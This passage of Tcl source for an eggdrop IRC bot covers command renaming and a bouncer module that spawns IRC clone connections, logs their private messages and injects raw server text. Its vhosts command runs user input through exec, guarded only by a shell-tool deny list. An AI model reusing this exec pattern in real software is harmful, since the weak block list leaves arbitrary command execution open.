	    default { set f "n" }
	}
	set q [expr $${B}($b)] ; if {$q != "-"} { lappend ${m}_help_list "$k $q $f" }
	if {$k == "msg"} { bind filt - ".help $q" bind:help }
    }
}
proc ${m}_module_setup {h i m l G g w p} {
    global bnick ; set a [module_array_vars $m] ; set y [local:for:me $G] ; eval [module_globals $m]
    #al "testing ${m}_module_setup" "h=$h, i=$i, m=$m, l=$l, G=$G, g=$g, y=$y, w=$w, p=$p, array_vars=$a"
    module_save_changes $h $i $m $l $G $g $w $p $a ; bind:change $w
}

al init "[module_name $m] (version [expr $${m}_ver]) loaded and ready!"; set ${m}_module_loaded 1; unset m}
set smart_bind_help {%{help=bind}%{+m|+m}
###  %b.bind%b
   Standard Interface to Bind Customisation Module.
   Displays module status and saved settings.
See also: .mbind
###  %b.bind -v%b
   Displays module status, complete command list and quick-help.
###  %b.bind ver%b
   Displays Bind Customisation Module version.
###  %b.bind author%b
   Displays informations about Module Author.
###  %b.bind clear%b
   Removes Bind Customisation configuration file.
See also: '.help clear'
###  %b.bind msg%b [which [keyword / -]]
   Sets the keyword to trigger a MSG bind.
   'which' can be one of: op deop kick invite ident chat pass raw.
   For example, if you use '.bind msg op foffo', to gain op you
   will have to do a '/msg botnick foffo your_password' instead of
   '/msg botnick op your_password'.. You can use '-' as keyword to
   disable some binds.
Note: .restart is higly suggested after bind changes.
See also: .bind dcc
###  %b.bind dcc%b [which [keyword / -]]
   Sets the keyword to trigger a DCC bind.
   'which' can be one of: tcl set die dump.
   For example, if you use '.bind dcc set bobbu', to set some
   variables you will have to do a '.bobbu varname value' instead
   of '.set varname value'.
Note: .restart is higly suggested after bind changes.
See also: .bind msg
%{help=mbind}%{+m|+m}
###  %b.mbind%b ...
   Standard Mass interface for Bind Module.
See also: '.help mass'
%{-}%{help=msg_pass}
###  /msg %B %bmsg_pass_command%b <yourpassword> [newpassword]
   Sets (or changes) your password to access bot services.
%{help=msg_ident}
###  /msg %B %bmsg_ident_command%b <yourpassword> <yourhandle>
   Lets the bot recognize you with your current ident/host and adds
   the new hostmask to your user-record.
Note: when a new host is added it`s a good idea to join the party
       line and check your hosts with .whois <handle> ..
%{help=msg_invite}%{+o|+o}
###  /msg %B %bmsg_invite_command%b <yourpassword> [#channel]
   Performs the bot to invite you to all bot channels or to a
   specified one.
%{help=msg_op}%{+o|+o}
###  /msg %B %bmsg_op_command%b <yourpassword> [#channel]
   Performs the bot to op you on all channels or in a specified one.
%{help=msg_chat}%{+p}
###  /msg %B %bmsg_chat_command%b <yourpassword>
   Performs the bot to send you a DCC-CHAT request. When establishing
   connection bot will ask for your handle (the nick you use in the 
   bot) and your password. Then you'd be join the partyline.
%{help=msg_deop}%{+o|+o}
###  /msg %B %bmsg_deop_command%b <yourpassword> <#channel> <nick>
   Performs the bot to deop specified nick on a specified channel.
%{help=msg_kick}%{+o}
###  /msg %B %bmsg_kick_command%b <yourpassword> <#channel> <nick>
   Performs the bot to kick specified nick on a specified channel.
%{help=msg_raw}%{+n}
###  /msg %B %bmsg_raw_command%b <yourpassword> <command>
   Makes the bot to send the specified raw-text (command) to server.}
set smart_bnc {# Bounce System

global wpref bnc_module_loaded max-dcc my-hostname my-ip owner server servers default-port ping_who ping_idx
global bnick botnick users_port all_port
global bnc bnc_p bnc_vh bnc_m bnc_t bnc_l bnc_irc bnc_psy bnc_mr bnc_pt bnc_pass bnc_rev bnc_rev1 bnc_module_conf bnc_u

bind dcc o|o bounce dcc:bounce
bind dcc o|o bnc dcc:bounce

proc botvhost {} {
    global my-hostname my-ip
    set r [myip]
    if {[info exists my-hostname] && ${my-hostname} != ""} {
	set r ${my-hostname}
    } elseif {[info exists my-ip] && ${my-ip} != ""} {
	set r ${my-ip}
    }
    return $r
}

set bnc "off"
set bnc_p 58000
set bnc_vh "default"
set bnc_m 3
set bnc_t "closed"
set bnc_l "on"
set bnc_irc "on"
set bnc_psy "on"
set bnc_mr 10
set bnc_pt 20
set bnc_pass "off"
set bnc_rev ""
set bnc_rev1 "5.3"
set bnc_module_conf "$wpref.bnc"

# 256 = info 263 = error 382 = rehash 461 = parameter
proc pn {i n t} {
    global bnc_u
    if {![valididx $i] || ![info exists bnc_u($i)]} { return 0 }
    if {[bi $bnc_u($i) 7] == "on"} {
	putdcc $i ":[boja] $n Bouncer $t"
    } else {
	putdcc $i "[boja] \[Bouncer\] - $t"
    }
    return 1
}

proc sputs {s w} {
    global errorInfo
    if {[info exists errorInfo] && $errorInfo != ""} { set o $errorInfo }
    catch {puts $s $w} e
    if {$e != ""} {
	if {[info exists o]} { set errorInfo $o } else { set errorInfo "" }
	return "[boja] - $e"
    }
    return 0
}

proc bnc_save {} {
    global bnc_module_conf bnc bnc_vh bnc_p bnc_m bnc_t bnc_l bnc_pass bnc_rev bnc_irc bnc_psy bnc_mr bnc_pt
    set fd [open $bnc_module_conf w]
    puts $fd "set bnc \"$bnc\""
    puts $fd "set bnc_vh \"$bnc_vh\""
    puts $fd "set bnc_p $bnc_p"
    puts $fd "set bnc_m $bnc_m"
    puts $fd "set bnc_t \"$bnc_t\""
    puts $fd "set bnc_l \"$bnc_l\""
    puts $fd "set bnc_irc \"$bnc_irc\""
    puts $fd "set bnc_psy \"$bnc_psy\""
    puts $fd "set bnc_mr $bnc_mr"
    puts $fd "set bnc_pt $bnc_pt"
    puts $fd "set bnc_pass \"$bnc_pass\""
    puts $fd "set bnc_rev \"$bnc_rev\""
    close $fd
}

if {![file exist $bnc_module_conf]} {
    set bnc_rev $bnc_rev1
    bnc_save
    al init "Bouncer configuration file not found : generating defaluts.."
}

source $bnc_module_conf

if {$bnc_rev1 != $bnc_rev} {
    set bnc_rev $bnc_rev1
    bnc_save
}

unset bnc_rev1

proc bnc_k {i {r "Bye!"}} {
    global bnc_u bnc_module_conf
    if {[info exists bnc_u($i)]} {
	set q [bi $bnc_u($i) 3]
	set o [bi $bnc_u($i) 0]
	if {[validsocket $o]} {
	    sputs $o "quit :$r"
	    dosocket close $o
	}
	if {[valididx $i]} { killdcc $i }
	unset bnc_u($i)
    } else {
	set q "Unknow user"
    }
    if {[file exists $bnc_module_conf.conn.$i]} {
	file delete -force -- $bnc_module_conf.conn.$i
    }
    foreach t [timers] { if {[string match *bnc_*$i* $t]} { killtimer [lindex $t 2] } }
    foreach t [utimers] { if {[string match *bnc_*$i* $t]} { killutimer [lindex $t 2]} }
    bnc_log "$q ( idx $i ) has left Bounce System."
}

proc bnc_start p {
    global errorInfo
    if {[info exists errorInfo] && $errorInfo != ""} { set o $errorInfo }
    catch {listen $p script bnc_conn} e
    if {$e != $p} { if {[info exists o]} { set errorInfo $o } else { set errorInfo "" } ; return 0 }
    return 1
}

proc bnc_stop {{w 0}} {
    global bnc_p bnc_u bnc_module_conf
    if {[info exists w] && $w} {
	foreach i [array names bnc_u] {
	    if {[valididx $i]} {
		pn $i 263 "[b]Sorry, Halting System ![b]" ; pn $i 256 "See you next time ! ;)"
	    }
	    bnc_k $i "Halting Bounce System"
	}
	set c [glob -nocomplain -- $bnc_module_conf.conn.*]
	foreach f $c { file delete -force -- $f }
    }
    foreach d [dcclist TELNET] {
	if {[lindex $d 2] == "bnc_conn"} { catch {listen [lindex [lindex $d 4] 1] off} }
    }
}

bind dcc m vhosts dcc:vhosts

proc vhosts {{w ""}} {
    global errorInfo
    if {[info exists errorInfo] && $errorInfo != ""} {
	set o $errorInfo
    }
    if {$w == ""} { set w vhosts }
    catch {set t [exec $w]} e
    if {![info exists t]} {
	if {[info exists o]} { set errorInfo $o } else { set errorInfo "" }
	return $e
    }
    return $t
}

proc dcc:vhosts {h i a} {
    set w [bi $a 0]
    if {$w != "" && [lsearch -regexp "kill rm cp mv ls halt reboot cat ftp telnet finger who uname" $w] != -1} {
	pb $i "Don 't joke please.."
	return 0
    }
    putcmdlog "\#$h\# vhosts $w"
    set l [split [vhosts $w] \n]
    foreach v $l { pb $i $v }
}

bind dcc n spawn dcc:spawn
proc dcc:spawn {h i a} {
    dcc:bounce $h $i "spawn $a"
}

proc dcc:bounce {h i a} {
    global bnc bnc_vh bnc_p bnc_m bnc_t bnc_l bnc_pass bnc_rev bnc_module_conf bnc_irc bnc_psy bnc_mr bnc_pt bnc_u owner server servers default-port
    set c [strl [bi $a 0]]
    set p [strl [bi $a 1]]
    if {$c == ""} {
	putcmdlog "\#$h\# bounce"
	pb $i "----=>[b]Bouncer Status[b]<=-----"
	pb $i "System version \t: [b]$bnc_rev[b]"
	pb $i "Bouncer status \t: [b]$bnc[b]"
	set q $bnc_vh
	if {$q == "default"} {
	    append q " [b]( [botvhost] )[b]"
	}
	pb $i "Bouncer vhost  \t: [b]$q[b]"
	pb $i "Listening  port\t: [b]$bnc_p[b]"
	if {$bnc_m == 0} {
	    set q "[b]disabled[b]"
	} else {
	    set q "[b]$bnc_m[b] users"
	}
	pb $i "Max connections\t: $q"
	pb $i "Access type    \t: [b]$bnc_t[b]"
	pb $i "Command logging\t: [b]$bnc_l[b]"
	pb $i "IRC-Style mex  \t: [b]$bnc_irc[b]"
	pb $i "PSY-BNC mode   \t: [b]$bnc_psy[b]"
	if {$bnc_mr == 0} {
	    set q "[b]unlimited[b]"
	} else {
	    set q "[b]$bnc_mr[b] tryes"
	}
	pb $i "Max reconnect  \t: $q"
	if {$bnc_pt == 0} {
	    set q "[b]disabled[b]"
	} else {
	    set q "every [b]$bnc_pt[b] minutes"
	}
	pb $i "IRC-Ping time  \t: $q"
	set r [bnc_logs $h]
	pb $i "Readable mex   \t: $r"
	if {$bnc_pass == "off"} {
	    set q "disabled"
	} else {
	    set q "enabled"
	}
	pb $i "System password\t: [b]$q[b]"
	pb $i "---------------------------"
	set c "who"
    }
    if {$c != "who" && ![matchattr $h n]} {
	pb $i "Sorry, you have no acces to bouncer commands."
	pb $i "Try '.help bounce' to know more.."
	return 0
    }
    switch -exact -- $c {
	"on" - "off" {
	    if {$c == $bnc} {
		pb $i "Bouncer is already $c ! ;)"
		return 0
	    }
	    bnc_stop 1
	    if {$c == "on"} {
		if {[bnc_start $bnc_p]} {
		    putcmdlog "\#$h\# bounce on"
		    set bnc $c
		    bl "Bounce System [b]enabled[b] : Authorized by $h."
		} else {
		    pb $i "Error opening port [b]$bnc_p[b] ! Try '.bounce port <newport>' to change it.."
		}
	    } else {
		putcmdlog "\#$h\# bounce off"
		set bnc $c
		bl "Bounce System [b]disabled[b] : Authorized by $h."
	    }
	    bnc_save
	}
	"vhost" {
	    if {$p == ""} {
		putcmdlog "\#$h\# bounce $c"
		set q $bnc_vh
		if {$q == "default"} { append q " [b]( [botvhost] )[b]" }
		pb $i "Bounce default vhost is : [b]$q[b]."
		pb $i "Try '.vhosts' to have a list or '.bounce vhost <newvhost>' to modify.."
		return 0
	    }
	    putcmdlog "\#$h\# bounce $c [bi $a 1]"
	    set bnc_vh [bi $a 1]
	    bnc_save
	    bl "Bouncer default vhost set to : [b]$bnc_vh[b] : Authorized by $h."
	}
	"port" {
	    if {$p == ""} {
		putcmdlog "\#$h\# bounce $c"
		pb $i "Bounce port is : [b]$bnc_p[b]. Use '.bounce port <newport>' to modify.."
		return 0
	    }
	    if {[string trim $p "0123456789"] != "" || [expr $p] > 65535} {
		pb $i "Please, enter a numeric value < 65536.."
		return 0
	    }
	    if {![bnc_start $p]} {
		pb $i "Error opening port [b]$p[b] ! Try another one please.."
		return 0
	    }
	    putcmdlog "\#$h\# bounce $c $p"
	    bnc_stop
	    set bnc_p $p
	    bnc_save
	    if {$bnc == "on"} {
		bnc_start $p
	    }
	    bl "Bouncer port set to [b]$bnc_p[b] : Authorized by $h."
	}
	"max" {
	    if {$p == ""} {
		putcmdlog "\#$h\# bounce $c"
		pb $i "Max allowed users\# : [b]$bnc_m[b]. Use '.bounce max <users\#>' to modify.."
		return 0
	    }
	    if {[string trim $p "0123456789"] != ""} {
		pb $i "Please, enter a numeric value ( 0 to disable ).."
		return 0
	    }
	    putcmdlog "\#$h\# bounce $c $p"
	    set bnc_m $p
	    bnc_save
	    if {$p == 0} {
		set q "disabled"
	    } else {
		set q "set to [b]$p[b]"
	    }
	    bl "Bouncer max allowed users\# $q : Authorized by $h."
	}
	"type" {
	    if {$p == ""} {
		putcmdlog "\#$h\# bounce $c"
		pb $i "Bouncer access type is : [b]$bnc_t[b]. Use '.bounce type <opened/closed>' to modify.."
		return 0
	    }
	    if {[lsearch -exact "opened closed" $p] == -1} {
		pb $i "Usage : '.bounce type [b]opened[b]' or '.bounce type [b]closed[b]'."
		return 0
	    }
	    putcmdlog "#$h# bounce $c $p"
	    set bnc_t $p
	    bnc_save
	    bl "Bounce System access type set to [b]$p[b] : Authorized by $h."
	}
	"log" {
	    if {$p == ""} {
		putcmdlog "\#$h\# bounce $c"
		pb $i "System Logging is : [b]$bnc_l[b]. Use '.bounce log <on/off>' to modify.."
		return 0
	    }
	    if {[lsearch -exact "on off" $p] == -1} {
		pb $i "Usage : '.bounce log [b]on[b]' or '.bounce log [b]off[b]'."
		return 0
	    }
	    putcmdlog "\#$h\# bounce $c $p"
	    set bnc_l $p
	    bnc_save	
	    bl "Bounce System logging set to [b]$bnc_l[b] : Authorized by $h."
	}
	"irc" {
	    if {$p == ""} {
		putcmdlog "\#$h\# bounce $c"
		pb $i "IRC-Style mode is : [b]$bnc_irc[b]. Use '.bounce irc <on/off>' to modify.."
		return 0
	    }
	    if {[lsearch -exact "on off" $p] == -1} {
		pb $i "Usage : '.bounce irc [b]on[b]' or '.bounce irc [b]off[b]'."
		return 0
	    }
	    putcmdlog "\#$h\# bounce $c $p"
	    set bnc_irc $p
	    bnc_save	
	    bl "Bounce System IRC-Style mode set to [b]$bnc_irc[b] : Authorized by $h."
	}
	"psy" {
	    if {$p == ""} {
		putcmdlog "\#$h\# bounce $c"
		pb $i "PSY-BNC mode is : [b]$bnc_psy[b]. Use '.bounce psy <on/off>' to modify.."
		return 0
	    }
	    if {[lsearch -exact "on off" $p] == -1} {
		pb $i "Usage : '.bounce psy [b]on[b]' or '.bounce psy [b]off[b]'."
		return 0
	    }
	    putcmdlog "\#$h\# bounce $c $p"
	    set bnc_psy $p
	    bnc_save	
	    bl "Bounce System PSY-BNC mode set to [b]$bnc_psy[b] : Authorized by $h."
	}
	"reconn" {
	    if {$p == ""} {
		putcmdlog "\#$h\# bounce $c"
		if {$bnc_mr == 0} {
		    set q "unlimited"
		} else {
		    set q $bnc_mr
		}
		pb $i "Maximum number of reconnect-tryes is : [b]$q[b]."
		pb $i "Use '.bounce reconn <max-tryes\#>' to modify.. ( 0 = unlimited )"
		return 0
	    }
	    if {[string trim $p "0123456789"] != ""} {
		pb $i "Please, enter a numerical value ( 0 = unlimited )"
		return 0
	    }
	    putcmdlog "\#$h\# bounce $c $p"
	    set bnc_mr [expr $p]
	    bnc_save
	    if {$p == 0} {
		set q "unlimited"
	    } else {
		set q $p
	    }
	    bl "Bounce maximum number of reconnect-tryes set to [b]$q[b] : Authorized by $h."
	}
	"ping" {
	    if {$p == ""} {
		putcmdlog "\#$h\# bounce $c"
		if {$bnc_pt == 0} {
		    set q "[b]disabled[b]"
		} else {
		    set q "[b]$bnc_pt[b] minutes"
		}
		pb $i "Current IRC-ping interval is : $q."
		pb $i "Use '.bounce ping <minutes\#>' to modify.. ( valid range is 5 - 60 minutes, 0 to disable )"
		return 0
	    }
	    if {[string trim $p "0123456789"] != "" || ($p != 0 && ([expr $p] > 60 || [expr $p] < 5))} {
		pb $i "Please, enter a numerical value in the range 5 - 60 minutes ( 0 to disable )"
		return 0
	    }
	    putcmdlog "\#$h\# bounce $c $p"
	    set bnc_pt [expr $p]
	    bnc_save
	    if {$p == 0} {
		set q "[b]disabled[b]"
	    } else {
		set q "set to [b]$p[b] minutes"
	    }
	    bl "Bounce IRC-pingtime $q : Authorized by $h."
	}
	"pass" {
	    set p [bi $a 1]
	    if {$p == ""} {
		putcmdlog "\#$h\# bounce $c"
		if {$bnc_pass == "off"} {
		    set q "<disabled>"
		} else {
		    set q [decrypt [bi $owner 0] $bnc_pass]
		}
		pb $i "Bounce System password is : [b]$q[b] . Use '.bounce pass <newpassword>' to change, or '.bounce pass off' to disable.."
		return 0
	    }
	    putcmdlog "\#$h\# bounce $c \[something..\]"
	    if {$p != "off"} {
		pb $i "Bouncer System password set to [b]$p[b]"
		set bnc_pass [encrypt [bi $owner 0] $p]
		bl "Bouncer password changed : Authorized by $h."
	    } else {
		set bnc_pass "off"
		bl "Bouncer System password [b]disabled[b] : Authorized by $h."
	    }
	    bnc_save
	}
	"who" - "info" {
	    if {$c == "who"} {
		putcmdlog "\#$h\# bounce $c"
		bnc_who $i 1
	    } else {
		if {$p == ""} {
		    pb $i "Usage : '.bounce info <idx\#>'. Try '.bounce who' to have a list of valid idx!"
		    return 0
		}
		if {![info exists bnc_u($p)]} {
		    pb $i "Sorry, [b]$p[b] is not a valid bounce-user idx : try '.bounce who' to have a list!"
		    return 0
		}
		putcmdlog "\#$h\# bounce $c $p"
		bnc_info $i $p
	    }
	}
	"kill" {
	    if {$bnc != "on"} {
		pb $i "Sorry, Bounce System is disabled.."
		return 0
	    }
	    if {$p == ""} {
		pb $i "Usage: '.bounce kill <idx#> \[reason\]'"
		return 0
	    }
	    if {[info exists bnc_u($p)]} {
		putcmdlog "\#$h\# bounce [br $a 0 end]"
		bl "Killed idx [b]$p[b] : [bi $bnc_u($p) 3] - [bi $bnc_u($p) 1] : Authorized by $h."
		set r [br $a 2 end]
		if {$r == ""} {
		    set r "no reason specified"
		}
		if {[valididx $p]} {
		    pn $p 263 "[b]You have been killed![b]"
		    pn $p 461 "$h - $r"
		    pn $p 256 "See you next time !"
		}
		bnc_k $p "Local kill by $h ($r)"
	    } else {
		pb $i "Sorry, idx [b]$p[b] does not match a bouncer user! Try '.bounce who' to have a list.."
	    }
	}
	"ver" {
	    putcmdlog "\#$h\# bounce $c"
	    pb $i "Bounce System version [b]$bnc_rev[b] by ^Boja^."
	}
	"read" {
	    if {$p == ""} {
		putcmdlog "\#$h\# bounce $c"
		set r [bnc_logs $h]
		pb $i "Readable messages : $r"
		if {$r != "[b]no [b]messages[b][b]"} {
		    pb $i "Type '.bounce read <mex-ID\#>' to read ( and delete ) messages.."
		}
		return 0
	    }
	    set l "$bnc_module_conf.msg.[strl $h].$p"
	    if {![file exists $l]} {
		pb $i "Invalid idx! I need a numerical value matching a valid message-log!"
		pb $i "Type '.bounce read' to have a list! ;)"
		return 0
	    }
	    putcmdlog "\#$h\# bounce $c $p"
	    set fd [open $l r]
	    while {![eof $fd]} {
		gets $fd d
		if {[eof $fd]} { break }
		set d [ctime $d]
		gets $fd m
		pb $i "$m ( $d )"
	    }
	    close $fd
	    file delete -force $l
	    pb $i "Bounce: Ok, logfile for virtual clone $l readed and deleted! ;)"
	}
	"fake" {
	    set w [br $a 2 end]
	    if {$w == ""} {
		pb $i "Usage : '.bounce fake <idx\#> <text>"
		return 0
	    }
	    if {![info exists bnc_u($p)]} {
		pb $i "Sorry, idx [b]$p[b] does not match a bouncer user! Try '.bounce who' to have a list.."
		return 0
	    }
	    set o [bi $bnc_u($p) 0]
	    if {![validsocket $o]} {
		pb $i "Problems trying to write on server socket ( $o ).. Please retry later!"
		return 0
	    }
	    putcmdlog "\#$h\# bounce $c $p \[..\]"
	    sputs $o $w
	    pb $i "Ok, done ! ;)"
	}
	"spawn" - "bot" {
	    if {$p == ""} {
		if {$c == "bot"} { set q "<botnet-nick>" } else { set q "<nick>" }
		pb $i "Usage : '.bounce $c $q \[vhost\[@server\[@port\[@password\]\]\] \[ident \[realname\]\]\]'"
		return 0
	    }
	    set n [bi $a 1]
	    set v [bi [split [bi $a 2] @] 0]
	    if {[string match *@* [bi $a 2]]} {
		set s [string range [bi $a 2] [expr [string first @ [bi $a 2]] + 1] end]
	    } else {
		set s ""
	    }
	    set u [bi $a 3]
	    set r [br $a 4 end]
	    if {$c == "bot"} {
		if {![matchattr $n b]} {
		    pb $i "Sorry, I don 't recognize [b]$n[b] as a valid bot.. User '.match +b' to have a list!"
		    return 0
		}
		if {[passwdok $n ""]} {
		    pb $i "You must set a password for bot $n first! Use '.chpass $n <password>' to do that!"
		    return 0
		}
	    }
	    if {$v == ""} { set v $bnc_vh }
	    if {$s == ""} {
		set q [lsearch -regexp $servers $server]
		if {$server == "" || $q == -1} {
		    pb $i "Please, specify a server ! ( in the format 'server' or 'server@port' or 'server@port@passowrd' )"
		    return 0
		}
		set s [bi [lindex $servers $q] 0]
		set k [bi [split $s :] end]
		if {[string trim $k "0123456789"] != ""} {
		    set p [bi [split $s :] [expr [llength [split $s :]] - 2]]
		    set s [string range $s 0 [expr [string last : $s] - 1]]
		    set s "[string range $s 0 [expr [string last : $s] - 1]]@$p@$k"
		} else {
		    set s "[string range $s 0 [expr [string last : $s] - 1]]@$k"
		}
	    }
	    if {![string match *@* $s]} {
		if {[info exists default-port]} {
		    append s "@${default-port}"
		} else {
		    append s "@6667"
		}
	    }
	    putcmdlog "\#$h\# bounce $c [br $a 1 end]"
	    if {$u == ""} { set u [rw 9] }
	    if {$r == ""} { set r "Bounce System version $bnc_rev by ^Boja^" }
	    if {$c == "bot"} {
		set bnc_u(0) "0 [myip] Bot $n $n $s 1 on $bnc_pt off 0 on 1 $u [list $r] @ 0 @ $v @"
	    } else {
		set bnc_u(0) "0 [myip] Owner $h $n $s 0 on $bnc_pt off 0 on 1 $u [list $r] [list [channels]] 0 @ $v @"
	    }
	    bnc_go 0
	    if {$bnc != "on"} {
		pb $i "[b]Warning!!! [b]Bounce System is [b]off[b], so the connection will die at first rehash/restart.. To make it a permanent connection, first use '[b].bounce on[b]'!"
	    }
	}
	default {
	    putcmdlog "\#$h\# bounce help"
	    pb $i "Usage: .bounce \[on/off\]"
	    pb $i "       .bounce port \[port-number\]"
	    pb $i "       .bounce vhost \[default-vhost\]"
	    pb $i "       .bounce max \[0 / max-users\#\]"
	    pb $i "       .bounce log \[on/off\]"
	    pb $i "       .bounce irc \[on/off\]"
	    pb $i "       .bounce psy \[on/off\]"
	    pb $i "       .bounce reconn \[0 / max-tryes\#\]"
	    pb $i "       .bounce ping \[0 / minutes\#\]"
	    pb $i "       .bounce pass \[password\]"
	    pb $i "       .bounce who"
	    pb $i "       .bounce info <idx\#>"
	    pb $i "       .bounce kill <idx\#> \[reason\]"
	    pb $i "       .bounce spawn <nick> \[vhost\[@server\[@port\[@password\]\]\] \[ident \[realname\]\]\]"
	    pb $i "       .bounce bot <botnet-nick> \[vhost\[@server\[@port\[@password\]\]\] \[ident \[realname\]\]\]"
	    pb $i "       .bounce fake <idx\#> <text>"
	    pb $i "       .bounce read \[message-ID\#\]"
	    pb $i "       .bounce ver"
	    pb $i "Try '.help bounce' to know more.. ;)"
	}
    }
}

proc bnc_ping i {
    global bnc_u ping_who ping_idx server
    if {![info exists bnc_u($i)]} { return 0 }
    set t [bi $bnc_u($i) 8]
    set n [stru [join [bi $bnc_u($i) 4]]]
    if {$n == "@"} { return 0 }
    if {$server != ""} {
	set ping_who($n) 2
	set ping_idx($n) $i
	putquick "PRIVMSG $n :\001PING [unixtime]\001"
    }
    if {![string match "*bnc_ping $i*" [timers]]} {
	timer $t "bnc_ping $i"
    }
}

proc bnc_dorej {s c {k ""}} {
    if {[validsocket $s]} {
	sputs $s "JOIN $c $k"
	utimer [expr 3 + [rand 3]] "if \{\[validsocket $s\]\} \{ sputs $s \"MODE $c\" \}"
    }
}

proc bnc_rej i {
    global bnc_u
    if {![info exists bnc_u($i)]} { return 0 }
    set o [bi $bnc_u($i) 0]
    set c [lindex $bnc_u($i) 15]
    set n 1
    foreach j $c {
	set w [lindex $j 0]
	set k [lindex $j 1]
	utimer $n "bnc_dorej $o $w $k"
	incr n 2
    }
    if {![valididx $i] && [bi $bnc_u($i) 10] != 0 && ![string match "*bnc_rej $i*" [utimers]] && $c != "@"} {
	utimer 90 "bnc_rej $i"
    }
}

proc bnc_chk {i s} {
    global bnc_u bnc_mr
    if {![info exists bnc_u($i)]} { return 1 }
    proc qchk t {
	if {$t == ""} { return 1 }
	set t [strl $t]
	set f 0
	foreach x $t {
	    if {[lsearch -exact "error incorrect kill killed closing" $x] != -1} {
		set f 1
		break
	    }
	}
	return $f
    }
    if {![validsocket $s] || [eof $s]} {
	dosocket close $s
	set m "Error trying to restore connection ( idx $i, socket $s )"
	return 1
    }
    set t [sgets $s]
    if {[qchk [strl $t]]} {
	set m "Error trying to restore connection ( idx $i, socket $s )"
	if {$t != ""} { append m " - $t" }
	bnc_log $m
	if {$bnc_mr != 0 && [lindex $bnc_u($i) 16] >= $bnc_mr} {
	    bnc_sorry $i $t
	} elseif {![string match "*bnc_rc $i*" [timers]]} {
	    timer [expr 3 + [rand 8]] "bnc_rc $i"
	}
	return 1
    } else {
	if {[bi $bnc_u($i) 7] == "on"} { bnc_rf $i $t }
	if {[valididx $i]} { putdcc $i $t }
    }
    set bnc_u($i) [lreplace $bnc_u($i) 16 16 0]
    fileevent $s readable "bnc_vrecv $i $s"
    if {[bi $bnc_u($i) 7] == "on"} {
	utimer 20 "bnc_rej $i"
	utimer 30 "bnc_adj $i"
    }
    if {![string match "*bnc_cc $i*" [timers]]} {
	timer [expr 2 + [rand 5]] "bnc_cc $i"
    }
}

proc bnc_rc i {
    global bnc_u bnc_mr
    if {![info exists bnc_u($i)] || [bi $bnc_u($i) 10] == 0 || [valididx $i] || [validsocket [bi $bnc_u($i) 0]]} { return 0 }
    set s [split [bi $bnc_u($i) 5] @]
    set p [bi $s 1]
    set k [bi $s 2]
    set s [bi $s 0]
    set h [bi $bnc_u($i) 3]
    set n [join [lindex $bnc_u($i) 4]]
    set u [join [lindex $bnc_u($i) 13]]
    set r [join [lindex $bnc_u($i) 14]]
    set t [expr [lindex $bnc_u($i) 16] + 1]
    set bnc_u($i) [lreplace $bnc_u($i) 16 16 $t]
    set v [lindex $bnc_u($i) 18]
    foreach m [timers] {
	if {[lindex $m 1] == "bnc_ping $i"} {
	    killtimer [lindex $m 2]
	}
    }
    if {![string match "*bnc_cc $i*" [timers]]} {
	timer [expr 2 + [rand 5]] "bnc_cc $i"
    }
    if {[bi $bnc_u($i) 12]} {
	set q "connect spawned virtual clone [b]$i[b] for"
    } else {
	set q "reconnect virtual clone [b]$i[b] for"
    }
    bnc_log "Trying to $q $h to $s port $p .. ( try\# $t )"
    set o [sconn_try $s $p $v]
    if {![validsocket $o]} {
	bnc_log "Error trying to restore connection [b]$i[b] to $s port $p for $h - $o"
	if {![string match "*bnc_rc $i*" [timers]]} {
	    timer [expr 3 + [rand 8]] "bnc_rc $i"
	}
    } else {
	fconfigure $o -blocking 0 -buffering none
	fileevent $o readable "bnc_chk $i $o"
	set bnc_u($i) [lreplace $bnc_u($i) 0 0 $o]
	if {$k != ""} {
	    sputs $o "PASS $k"
	}
	if {[bi $bnc_u($i) 7] == "on"} {
	    sputs $o "NICK $n"
	    sputs $o "USER $u +isw $u :$r"
	}
    }
}

proc bnc_sorry {i {a ""}} {
    global bnc_u bnc_module_conf
    if {![info exists bnc_u($i)]} { return 0 }
    set h [bi $bnc_u($i) 3]
    set m "Sorry, your virtual clone has disconnected on [ctime [unixtime]]"
    if {$a != ""} {
	lappend m " - $a"
    }
    sendnote Bouncer $h $m
    set l "$bnc_module_conf.msg.[strl $h].$i"
    if {[file exists $l]} {
	sendnote Bouncer $h "There are some messages logged for you, use '.bounce read $i' to read!"
    }
    bnc_k $i
}

proc bnc_vrecv {i s} {
    global bnc_u bnc_mr bnc_module_conf
    if {![info exists bnc_u($i)]} { return 1 }
    if {[bi $bnc_u($i) 10] == 0} { return 1 }
    set h [bi $bnc_u($i) 3]
    set S [split [bi $bnc_u($i) 5] @]
    set t [sgets $s]
    if {![validsocket $s] || [eof $s] || [bi $t 0] == "ERROR"} {
	set m "Virtual clone [b]$i[b] ( owned by $h ) disconnected from server [bi $S 0] port [bi $S 1]"
	if {[validsocket $s]} {
	    append m " - $t"
	    dosocket close $s
	}
	bnc_log $m
	set bnc_u($i) [lreplace $bnc_u($i) 0 0 0]
	if {$bnc_mr == 0 || [expr [lindex $bnc_u($i) 16]] < $bnc_mr} {
	    if {![string match "*bnc_rc $i*" [utimers]]} {
		utimer [expr 3 + [rand 5]] "bnc_rc $i"
	    }
	} else {
	    set m "Unrecoverable error ( idx $i, socket $s )"
	    if {$t != ""} { append m " - $t" }
	    bnc_sorry $i $m
	}
	return 1
    }
    if {[bi $bnc_u($i) 7] == "on"} {
	bnc_rf $i $t
	if {[bi $bnc_u($i) 12] || [bi $bnc_u($i) 2] == "Bot"} { return 0 }
	set n [strl [join [lindex $bnc_u($i) 4]]]
	set q [bi $t 1]
	set d [strl [bi $t 2]]
	if {[lsearch -exact "PRIVMSG NOTICE" $q] != -1 && $d == $n} {
	    set l "$bnc_module_conf.msg.[strl $h].$i"
	    set fd [open $l a]
	    puts $fd [unixtime]
	    puts $fd $t
	    close $fd
	}
    }
}

proc bnc_br {s i c} {
    global bnc_u
    if {![validsocket $s] || ![valididx $i] || ![info exists bnc_u($i)]} { return 1 }
    set n [join [lindex $bnc_u($i) 4]]
    if {[bi $bnc_u($i) 2] == "Bot"} {
	putdcc $i ":$n JOIN :$c"
    } else {
	sputs $s "JOIN $c"
	putdcc $i ":$n JOIN :$c"
	sputs $s "NAMES $c"
	sputs $s "TOPIC $c"
    }
}

proc bnc_rrecv {i s} {
    global bnc_u
    if {![info exists bnc_u($i)]} { return 1 }
    set a [sgets $s]
    if {[bi $bnc_u($i) 7] == "on"} {
	switch -exact -- [bi $a 1] {
	    319 {
		set t [string range [br $a 4 end] 1 end]
		set h 1
		foreach j $t {
		    set k [string index $j 0]
		    if {$k == "@" || $k == "+"} {
			set c [string range $j 1 end]
		    } else {
			set c $j
		    }
